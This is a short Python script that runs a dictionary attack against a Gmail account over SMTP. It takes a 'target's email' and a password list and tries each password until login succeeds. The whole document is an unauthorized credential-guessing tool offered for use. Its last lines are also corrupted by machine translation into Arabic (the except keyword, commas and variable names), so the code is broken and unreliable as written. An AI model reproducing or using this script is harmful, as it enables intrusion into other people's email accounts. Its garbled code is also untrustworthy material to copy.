import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter the target's email :")
passwfile = input("Enter the password File :")
passwfile = open(passwfile, "r")

for password in passwfile :
        try :
                smtpserver.login(user,password)
                print (" Password Found ===> ", password)
                break;
        باستثناء   smtplib . SMTPAuthenticationError :
                print ( "كلمة المرور غير صحيحة ===>" ، كلمة المرور )
